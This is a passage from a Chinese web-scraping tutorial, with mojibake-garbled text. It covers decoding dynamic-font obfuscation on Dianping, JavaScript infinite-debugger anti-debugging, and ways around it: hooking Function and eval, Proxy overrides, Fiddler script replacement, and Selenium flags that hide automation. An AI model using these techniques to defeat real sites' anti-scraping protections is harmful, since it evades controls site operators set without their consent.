    <span class="s1">&#39;1&#39;</span><span class="p">:</span> <span class="p">[(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="mi">35</span><span class="p">),</span> <span class="o">...</span><span class="p">],</span>
    <span class="c1"># ... å…¶ä»–å­—ç¬¦</span>
<span class="p">}</span>

<span class="k">def</span><span class="w"> </span><span class="nf">recognize_char_by_outline</span><span class="p">(</span><span class="n">outline</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;é€šè¿‡è½®å»“è¯†åˆ«å­—ç¬¦&quot;&quot;&quot;</span>
    <span class="n">max_similarity</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">recognized_char</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

    <span class="k">for</span> <span class="n">char</span><span class="p">,</span> <span class="n">std_outline</span> <span class="ow">in</span> <span class="n">standard_glyphs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
        <span class="n">similarity</span> <span class="o">=</span> <span class="n">calculate_similarity</span><span class="p">(</span><span class="n">outline</span><span class="p">,</span> <span class="n">std_outline</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">similarity</span> <span class="o">&gt;</span> <span class="n">max_similarity</span><span class="p">:</span>
            <span class="n">max_similarity</span> <span class="o">=</span> <span class="n">similarity</span>
            <span class="n">recognized_char</span> <span class="o">=</span> <span class="n">char</span>

    <span class="k">return</span> <span class="n">recognized_char</span> <span class="k">if</span> <span class="n">max_similarity</span> <span class="o">&gt;</span> <span class="mf">0.8</span> <span class="k">else</span> <span class="s1">&#39;?&#39;</span>
</code></pre>
      </div>

      <p><strong>è¿›é˜¶å¯¹æŠ—: åŠ¨æ€å­—ä½“åçˆ¬</strong></p>

      <p>æŸäº›ç½‘ç«™ï¼ˆå¦‚å¤§ä¼—ç‚¹è¯„ï¼‰ä½¿ç”¨<strong>åŠ¨æ€å­—ä½“</strong>ï¼Œæ¯æ¬¡è®¿é—®å­—ä½“æ–‡ä»¶çš„æ˜ å°„å…³ç³»éƒ½ä¸åŒï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®¿é—® 1ï¼š&amp;#xe601; â†’ &quot;8&quot;</span>
<span class="c1"># è®¿é—® 2ï¼š&amp;#xe601; â†’ &quot;3&quot;  ï¼ˆæ˜ å°„å…³ç³»æ”¹å˜ï¼‰</span>
</code></pre>
      </div>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <ul>
        <li><strong>å®æ—¶è§£æ</strong>: æ¯æ¬¡è¯·æ±‚éƒ½é‡æ–°ä¸‹è½½å­—ä½“æ–‡ä»¶å¹¶è§£æ</li>
        <li><strong>æœºå™¨å­¦ä¹ </strong>: è®­ç»ƒ CNN æ¨¡å‹è¯†åˆ«å­—å½¢</li>
        <li><strong>OCR æ–¹æ¡ˆ</strong>: ä½¿ç”¨ Selenium æ¸²æŸ“åæˆªå›¾ OCR</li>
      </ul>

      <p><strong>å‚è€ƒæ¡ˆä¾‹åˆ†æ</strong>: å¤§ä¼—ç‚¹è¯„è¯„åˆ†å­—ä½“ç ´è§£</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">fontTools.ttLib</span><span class="w"> </span><span class="kn">import</span> <span class="n">TTFont</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">class</span><span class="w"> </span><span class="nc">DianpingFontCracker</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_font</span> <span class="o">=</span> <span class="kc">None</span>  <span class="c1"># åŸºå‡†å­—ä½“ï¼ˆå›ºå®šæ˜ å°„ï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_font</span> <span class="o">=</span> <span class="kc">None</span>  <span class="c1"># å½“å‰é¡µé¢å­—ä½“</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download_font</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½å­—ä½“æ–‡ä»¶&quot;&quot;&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;temp.woff&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">TTFont</span><span class="p">(</span><span class="s1">&#39;temp.woff&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">extract_font_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä» HTML ä¸­æå–å­—ä½“ URL&quot;&quot;&quot;</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;url\(&quot;(.*?\.woff)&quot;\)&#39;</span>
        <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="n">match</span> <span class="k">else</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">build_mapping</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">font</span><span class="p">,</span> <span class="n">base_font</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é€šè¿‡å¯¹æ¯”åŸºå‡†å­—ä½“å»ºç«‹æ˜ å°„&quot;&quot;&quot;</span>
        <span class="n">mapping</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">font</span><span class="o">.</span><span class="n">getBestCmap</span><span class="p">():</span>
            <span class="n">glyph_name</span> <span class="o">=</span> <span class="n">font</span><span class="o">.</span><span class="n">getBestCmap</span><span class="p">()[</span><span class="n">code</span><span class="p">]</span>
            <span class="n">outline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_outline</span><span class="p">(</span><span class="n">font</span><span class="p">,</span> <span class="n">glyph_name</span><span class="p">)</span>

            <span class="c1"># ä¸åŸºå‡†å­—ä½“å¯¹æ¯”</span>
            <span class="k">for</span> <span class="n">base_code</span><span class="p">,</span> <span class="n">base_glyph</span> <span class="ow">in</span> <span class="n">base_font</span><span class="o">.</span><span class="n">getBestCmap</span><span class="p">()</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                <span class="n">base_outline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_outline</span><span class="p">(</span><span class="n">base_font</span><span class="p">,</span> <span class="n">base_glyph</span><span class="p">)</span>

                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_similar</span><span class="p">(</span><span class="n">outline</span><span class="p">,</span> <span class="n">base_outline</span><span class="p">):</span>
                    <span class="c1"># åŸºå‡†å­—ä½“çš„å­—ç¬¦æ˜¯å·²çŸ¥çš„</span>
                    <span class="n">real_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">base_code</span><span class="p">)</span>
                    <span class="n">mapping</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">code</span><span class="p">)]</span> <span class="o">=</span> <span class="n">real_char</span>
                    <span class="k">break</span>

        <span class="k">return</span> <span class="n">mapping</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_outline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">font</span><span class="p">,</span> <span class="n">glyph_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–å­—å½¢è½®å»“&quot;&quot;&quot;</span>
        <span class="n">glyf</span> <span class="o">=</span> <span class="n">font</span><span class="p">[</span><span class="s1">&#39;glyf&#39;</span><span class="p">][</span><span class="n">glyph_name</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">glyf</span><span class="p">,</span> <span class="s1">&#39;coordinates&#39;</span><span class="p">):</span>
            <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="n">glyf</span><span class="o">.</span><span class="n">coordinates</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">[]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">is_similar</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">outline1</span><span class="p">,</span> <span class="n">outline2</span><span class="p">,</span> <span class="n">threshold</span><span class="o">=</span><span class="mf">0.9</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åˆ¤æ–­ä¸¤ä¸ªè½®å»“æ˜¯å¦ç›¸ä¼¼&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">outline1</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">outline2</span><span class="p">):</span>
            <span class="k">return</span> <span class="kc">False</span>
        <span class="k">return</span> <span class="n">calculate_similarity</span><span class="p">(</span><span class="n">outline1</span><span class="p">,</span> <span class="n">outline2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">threshold</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html_content</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£å¯†é¡µé¢å†…å®¹&quot;&quot;&quot;</span>
        <span class="c1"># 1. æå–å­—ä½“ URL</span>
        <span class="n">font_url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">extract_font_url</span><span class="p">(</span><span class="n">html_content</span><span class="p">)</span>

        <span class="c1"># 2. ä¸‹è½½å­—ä½“</span>
        <span class="n">current_font</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">download_font</span><span class="p">(</span><span class="n">font_url</span><span class="p">)</span>

        <span class="c1"># 3. å»ºç«‹æ˜ å°„</span>
        <span class="n">mapping</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">build_mapping</span><span class="p">(</span><span class="n">current_font</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">base_font</span><span class="p">)</span>

        <span class="c1"># 4. æ›¿æ¢åŠ å¯†æ–‡æœ¬</span>
        <span class="n">decrypted_html</span> <span class="o">=</span> <span class="n">html_content</span>
        <span class="k">for</span> <span class="n">enc_char</span><span class="p">,</span> <span class="n">real_char</span> <span class="ow">in</span> <span class="n">mapping</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="n">decrypted_html</span> <span class="o">=</span> <span class="n">decrypted_html</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">enc_char</span><span class="p">,</span> <span class="n">real_char</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">decrypted_html</span>
</code></pre>
      </div>

      <p><strong>èµ„æº</strong>:</p>

      <ul>
        <li><a href="https://cuiqingcai.com/6431.html">ä»Šå¤©ï¼Œæˆ‘ç»ˆäºå¼„æ‡‚äº†å­—ä½“åçˆ¬æ˜¯ä¸ªå•¥ç©æ„ï¼</a></li>
        <li><a href="https://blog.csdn.net/m0_49077792/article/details/111369149">ç»ˆäºè§£å†³å¤§ä¼—ç‚¹è¯„çš„å­—ä½“åçˆ¬äº†ï¼</a></li>
        <li><a href="https://blog.csdn.net/xing851483876/article/details/82928607">Pythonçˆ¬è™«å…­ï¼šå­—ä½“åçˆ¬å¤„ç†ï¼ˆçŒ«çœ¼+æ±½è½¦ä¹‹å®¶ï¼‰</a></li>
      </ul>

      <hr />

      <h3 id="7-javascript-åè°ƒè¯•æŠ€æœ¯">7. JavaScript åè°ƒè¯•æŠ€æœ¯</h3>

      <h4 id="71-æ— é™-debugger-å¾ªç¯">7.1 æ— é™ Debugger å¾ªç¯</h4>

      <p><strong>åŸç†</strong>: ä½¿ç”¨ <code>debugger</code> è¯­å¥é…åˆå®šæ—¶å™¨æˆ–é€’å½’ï¼ŒæŒç»­æš‚åœ JavaScript æ‰§è¡Œã€‚</p>

      <p><strong>å®ç°æ–¹å¼</strong>:</p>

      <p><strong>æ–¹å¼ 1: ç›´æ¥å¾ªç¯</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>æ–¹å¼ 2: è‡ªæ‰§è¡Œå‡½æ•°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">detect</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="nx">detect</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">detect</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <p><strong>æ–¹å¼ 3: eval/Function åŠ¨æ€æ‰§è¡Œ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">})[</span><span class="s1">&#39;constructor&#39;</span><span class="p">](</span><span class="s1">&#39;debugger&#39;</span><span class="p">)[</span><span class="s1">&#39;call&#39;</span><span class="p">]();</span>
<span class="p">},</span><span class="w"> </span><span class="mf">50</span><span class="p">);</span>

<span class="c1">// æˆ–ä½¿ç”¨ eval</span>
<span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;debugger&#39;</span><span class="p">);</span>
<span class="p">},</span><span class="w"> </span><span class="mf">50</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>æ–¹å¼ 4: æ—¶é—´æ£€æµ‹</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// æ£€æµ‹æ—¶é—´å·®ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨è°ƒè¯•</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Developer tools detected!&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// æ¸…ç©ºé¡µé¢æˆ–é‡å®šå‘</span>
<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;about:blank&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
      </div>

      <h4 id="72-ç»•è¿‡åè°ƒè¯•çš„æ–¹æ³•">7.2 ç»•è¿‡åè°ƒè¯•çš„æ–¹æ³•</h4>

      <p><strong>æ–¹æ³• 1: ç¦ç”¨æ‰€æœ‰æ–­ç‚¹</strong></p>

      <p>Chrome DevTools æ“ä½œ:</p>

      <ol>
        <li>æ‰“å¼€ Sources é¢æ¿</li>
        <li>ç‚¹å‡»å³ä¾§çš„"Deactivate breakpoints"æŒ‰é’®ï¼ˆå¿«æ·é”® Ctrl+F8ï¼‰</li>
        <li>æ‰€æœ‰ debugger è¯­å¥å°†è¢«å¿½ç•¥</li>
      </ol>

      <p><strong>æ–¹æ³• 2: Never Pause Here (æ°¸ä¸åœ¨æ­¤æš‚åœ)</strong></p>

      <pre><code>1. åœ¨ debugger è¡Œå³é”®
2. é€‰æ‹© "Never pause here"
3. è¯¥è¡Œçš„ debugger å°†è¢«å¿½ç•¥
</code></pre>

      <p><strong>æ–¹æ³• 3: æ¡ä»¶æ–­ç‚¹è¦†ç›–</strong></p>

      <pre><code>1. åœ¨ debugger è¡Œè®¾ç½®æ¡ä»¶æ–­ç‚¹
2. æ¡ä»¶è®¾ä¸º false
3. æ–­ç‚¹å°†æ°¸ä¸è§¦å‘
</code></pre>

      <p><strong>æ–¹æ³• 4: Hook Function æ„é€ å™¨</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ï¼ˆé€šè¿‡æµè§ˆå™¨æ‰©å±•æˆ– Fiddlerï¼‰</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">originalFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>

<span class="w">        </span><span class="c1">// æ£€æµ‹å¹¶ç§»é™¤ debugger</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">code</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;debugger&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Blocked debugger:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">            </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/debugger/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFunction</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// å¤„ç† eval</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">originalEval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;debugger&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Blocked eval debugger:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">            </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/debugger/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalEval</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 5: æœ¬åœ°æ–‡ä»¶æ›¿æ¢</strong></p>

      <p>ä½¿ç”¨ Fiddler/Charles æ›¿æ¢ JavaScript æ–‡ä»¶:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. ä¿å­˜åŸå§‹ JS æ–‡ä»¶</span>
<span class="c1">// 2. ç§»é™¤æ‰€æœ‰ debugger è¯­å¥</span>
<span class="c1">// 3. ä½¿ç”¨ Fiddler AutoResponder æ›¿æ¢</span>

<span class="c1">// Fiddler AutoResponder è§„åˆ™:</span>
<span class="c1">// REGEX:https://example.com/js/protect.js</span>
<span class="c1">// æœ¬åœ°æ–‡ä»¶è·¯å¾„: C:\temp\protect_cracked.js</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 6: Chrome DevTools Protocol (CDP)</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.chrome.options</span><span class="w"> </span><span class="kn">import</span> <span class="n">Options</span>

<span class="n">chrome_options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<span class="n">chrome_options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;excludeSwitches&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;enable-automation&#39;</span><span class="p">])</span>
<span class="n">chrome_options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;useAutomationExtension&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">chrome_options</span><span class="p">)</span>

<span class="c1"># ç¦ç”¨ debugger</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s1">&#39;Debugger.disable&#39;</span><span class="p">,</span> <span class="p">{})</span>

<span class="c1"># è®¾ç½®æ–­ç‚¹è¡Œä¸º</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s1">&#39;Debugger.setBreakpointsActive&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;active&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>

<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 7: é‡å†™ debugger (Proxy)</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Proxy æ‹¦æˆª debugger</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">construct</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/debugger/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="nx">args</span><span class="p">[</span><span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">code</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">target</span><span class="p">(...</span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nb">Function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nb">Function</span><span class="p">,</span><span class="w"> </span><span class="nx">handler</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <p><strong>å‚è€ƒèµ„æº</strong>:</p>

      <ul>
        <li><a href="https://blog.csdn.net/Revivedsun/article/details/105448505">æµè§ˆå™¨åè°ƒè¯•ç»•è¿‡æ— é™debuggeråŠä»£ç æ‰§è¡Œå™¨æ£€æµ‹</a></li>
        <li><a href="https://blog.csdn.net/wh445306/article/details/103638742">ç»•è¿‡JavaScript debuggerä¸‰ç§è§£å†³æ–¹æ³•</a></li>
        <li><a href="https://cloud.tencent.com/developer/article/2242577">JSé€†å‘ï¼šå¸¸è§æ— é™Debuggerä»¥åŠç»•è¿‡æ–¹æ³•</a></li>
        <li><a href="https://tree.moe/anti-debug-and-solution/">å‡ ç§å¸¸è§çš„å‰ç«¯åè°ƒè¯•æ–¹æ³•åŠçªç ´æ–¹å¼</a></li>
      </ul>

      <h4 id="73-æ£€æµ‹å¼€å‘è€…å·¥å…·">7.3 æ£€æµ‹å¼€å‘è€…å·¥å…·</h4>

      <p><strong>æ£€æµ‹æ–¹æ³• 1: çª—å£å°ºå¯¸æ£€æµ‹</strong></p>

